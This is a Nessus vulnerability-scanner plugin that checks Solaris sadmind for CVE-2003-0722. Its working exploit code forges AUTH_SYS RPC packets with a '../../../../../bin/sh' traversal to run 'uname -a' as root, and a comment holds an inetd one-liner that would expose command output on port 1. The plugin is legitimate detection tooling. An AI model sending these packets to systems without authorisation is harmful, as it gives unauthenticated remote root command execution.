#
# (C) Tenable Network Security, Inc.
#

# Greatly improved by H D Moore


include("compat.inc");

if (description)
{
 script_id(11841);
 script_version("1.34");
 script_cvs_date("Date: 2018/11/15 20:50:22");

 script_cve_id("CVE-2003-0722");
 script_bugtraq_id(8615);
 script_xref(name:"Secunia", value:"9742");

 script_name(english:"Solaris sadmind AUTH_SYS Credential Remote Command Execution");
 script_summary(english:"Executes a command on the remote host");

 script_set_attribute(attribute:"synopsis", value:"The remote RPC service allows execution of arbitrary commands.");
 script_set_attribute(attribute:"description", value:
"The remote host is running the sadmind RPC service.  It is possible to
misuse this service to execute arbitrary commands on this host as
root.");
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?1b0a45ca");
 script_set_attribute(attribute:"see_also", value:"https://seclists.org/bugtraq/2003/Sep/237");
 script_set_attribute(attribute:"see_also", value:"http://download.oracle.com/sunalerts/1000778.1.html");
 script_set_attribute(attribute:"solution", value:"Apply the appropriate patch referenced in the vendor's advisory.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"metasploit_name", value:'Solaris sadmind Command Execution');
 script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"vuln_publication_date", value:"2003/09/13");
 script_set_attribute(attribute:"plugin_publication_date", value:"2003/09/19");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_GATHER_INFO);
 script_copyright(english:"This script is Copyright (C) 2003-2018 and is owned by Tenable, Inc. or an Affiliate thereof.");
 script_family(english:"Gain a shell remotely");

 script_dependencie("rpc_portmap.nasl");

 script_require_keys("rpc/portmap");
 exit(0);
}

#
# The script code starts here
#


include("audit.inc");
include("misc_func.inc");
include("nfs_func.inc"); # RPC functions
include("sunrpc_func.inc");


RPC_PROG = 100232;
tcp = 0;
port = get_rpc_port2(program:RPC_PROG, protocol:IPPROTO_UDP);
if (!port) exit(0);
if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

soc = open_sock_udp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "UDP");

req = "a2bd60db0000000000000002000187880000000a00000001000000010000001c3f6a0f8c000000076578706c6f69740000000000000000000000000000000000000000003f6a0f90000745df0000000000000000000000000000000000000000000000060000000000000000000000000000000400000000000000047f000001000187880000000a000000047f000001000187880000000a000000110000001e000000000000000000000000000000000000003b6578706c6f697400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000673797374656d0000000000152e2e2f2e2e2f2e2e2f2e2e2f2e2e2f62696e2f73680000000000041a0000000e41444d5f46575f56455253494f4e000000000003000000040000000100000000000000000000000841444d5f4c414e470000000900000002000000014300000000000000000000000000000d41444d5f524551554553544944000000000000090000001200000011303831303a313031303130313031303a3100000000000000000000000000000941444d5f434c41535300000000000009000000070000000673797374656d000000000000000000000000000e41444d5f434c4153535f564552530000000000090000000400000003322e310000000000000000000000000a41444d5f4d4554484f4400000000000900000016000000152e2e2f2e2e2f2e2e2f2e2e2f2e2e2f62696e2f736800000000000000000000000000000841444d5f484f5354000000090000003c0000003b6578706c6f6974000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f41444d5f434c49454e545f484f5354000000000900000008000000076578706c6f69740000000000000000000000001141444d5f434c49454e545f444f4d41494e00000000000009000000010000000000000000000000000000001141444d5f54494d454f55545f5041524d53000000000000090000001c0000001b54544c3d302050544f3d32302050434e543d322050444c593d33300000000000000000000000000941444d5f46454e43450000000000000900000000000000000000000000000001580000000000000900000003000000022d6300000000000000000000000000015900000000000009000002010000020069640000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000106e65746d67745f656e646f6661726773";

send(socket:soc, data:hex2raw(s:req));
r = recv(socket:soc, length:512);
if (!r) audit(AUDIT_RESP_NOT, port, 'a request', 'UDP', code:0);

hostname = strstr(r, "Security exception on host");
if(!hostname)exit(0);
hostname = ereg_replace(pattern:".*on host ([^ ]*)\. .*", string:hostname, replace:"\1");

# pad the hostname to a multiple of four bytes
adm_client_host = hostname;
while ((strlen(adm_client_host) % 4) != 0)
 adm_client_host = adm_client_host + '\x00';

# The output command is not piped back to us. We will just check the error code
# sent back by rpc.sadmind
command = "uname -a";

# Other commands could be :
#command = "echo 'Nessus can execute arbitrary commands on this host' > /tmp/nessus.$$";
#
# And ask the user to see if there is a /tmp/nessus.$$ or even :
#
# command = "echo tcpmux stream tcp nowait root /usr/bin/id id > /tmp/nessus; /usr/sbin/inetd -s /tmp/nessus; rm /tmp/nessus;";
#
# And then try to connect to port 1 and get the output of /bin/id. However this is intrusive

command_pad =  crap(data:'\0', length:512 - strlen(command));


pad = padsz(len:strlen(hostname));

rpc = 	rpclong(val:rand()) +
      	rpclong(val:0) +
	    rpclong(val:2) +
	    rpclong(val:100232) +
	    rpclong(val:10) +
	    rpclong(val:1)   +
	    rpclong(val:1);



auth_len = 20 + strlen(hostname) + pad;

auth = 	rpclong(val:auth_len) +
	    rpclong(val:rand()) +
        rpclong(val:strlen(hostname)) +
	    hostname +
	    rpcpad(pad:pad) +
	    rpclong(val:0) +
	    rpclong(val:0) +
	    rpclong(val:0) +
	    rpclong(val:0) +
	    rpclong(val:0);

rpc2 = rpc + auth;


packed_host = hostname + crap(data:'\0', length:59 - strlen(hostname));


header = strcat(
    '\x3f\x6a\x0f\x90',                 # Timestamp
	'\x00\x07\x45\xdf' ,                # Random Field
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x06' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x04' ,

    '\x7f\x00\x00\x01' ,                # 127.0.0.1
    '\x00\x01\x87\x88' ,                # SADMIND

    '\x00\x00\x00\x0a\x00\x00\x00\x04' ,

    '\x7f\x00\x00\x01' ,                # 127.0.0.1
    '\x00\x01\x87\x88' ,                # SADMIND

    '\x00\x00\x00\x0a\x00\x00\x00\x11\x00\x00\x00\x1e' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x00' ,

    '\x00\x00\x00\x3b' , packed_host ,

    '\x00\x00\x00\x00\x06' , 'system' ,

    '\x00\x00\x00\x00\x00\x15' , '../../../../../bin/sh' , '\x00\x00\x00');



body = 	strcat('\x00\x00\x00\x0e', 'ADM_FW_VERSION' ,
    '\x00\x00\x00\x00\x00\x03\x00\x00\x00\x04\x00\x00' ,
    '\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x08' , 'ADM_LANG' ,
    '\x00\x00\x00\x09\x00\x00\x00\x02\x00\x00' ,
    '\x00\x01' ,  'C' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x0d' ,  'ADM_REQUESTID' ,
     '\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x12\x00\x00\x00\x11' ,
    '0810:1010101010:1' , '\x00\x00\x00' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00' ,

    '\x00\x00\x00\x09' , 'ADM_CLASS' ,
    '\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x07' ,
    '\x00\x00\x00\x06' , 'system' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x0e'  ,  'ADM_CLASS_VERS' ,
    '\x00\x00\x00\x00\x00\x09\x00\x00\x00\x04' ,
    '\x00\x00\x00\x03' ,  '2.1' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,


    '\x00\x00\x00\x0a' , 'ADM_METHOD' ,
    '\x00\x00\x00\x00\x00\x09\x00\x00\x00\x16' ,
    '\x00\x00\x00\x15' , '../../../../../bin/sh' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,

    '\x00\x00\x00\x08' , 'ADM_HOST' ,
    '\x00\x00\x00\x09\x00\x00\x00\x3c\x00\x00\x00\x3b' ,
    packed_host ,

    '\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x0f' , 'ADM_CLIENT_HOST' ,
    '\x00\x00\x00\x00\x09' ,
    rpclong(val:strlen(hostname) + 1) ,
    rpclong(val:strlen(hostname)) ,
    adm_client_host ,
    '\x00\x00\x00\x00' , '\x00\x00\x00\x00' ,
    '\x00\x00\x00\x11' ,  'ADM_CLIENT_DOMAIN' ,
    '\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x11' , 'ADM_TIMEOUT_PARMS' ,
    '\x00\x00\x00\x00\x00' ,
    '\x00\x09\x00\x00\x00\x1c' ,
    '\x00\x00\x00\x1b' , 'TTL=0 PTO=20 PCNT=2 PDLY=30' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x09' , 'ADM_FENCE' ,
    '\x00\x00\x00\x00\x00\x00\x09\x00\x00\x00\x00\x00\x00\x00\x00\x00' ,
    '\x00\x00\x00\x00\x00\x00\x01\x58\x00\x00\x00\x00\x00\x00\x09\x00' ,
    '\x00\x00\x03\x00\x00\x00\x02'  , '-c' ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x59\x00' ,
    '\x00\x00\x00\x00\x00\x09\x00\x00\x02\x01\x00\x00\x02\x00' ,
    command , command_pad ,
    '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10' ,
    'netmgt_endofargs');


packet = rpc2 + header + rpclong(val:strlen(body) + strlen(header) + 4 - 330) + body;

# send three requests for verification
for (x=0; x<3; x++)
{
    soc = open_sock_udp(port);
    if(!soc)exit(0);

    send(socket:soc, data:packet);
    r = recv(socket:soc, length:512);

    if(strlen(r) >= 22)
    {
     if(ord(r[22]) == 0 && ord(r[21]) == 0 && ord(r[20]) == 0 && ord(r[19]) == 0)
     {
      code = substr(r, strlen(r) - 12, strlen(r) - 1);
      if('000000000000000000000000' >< hexstr(code))
      {
       security_hole(port:port, proto:"udp");
       exit(0);
      }
     }
    }
    close(soc);
}

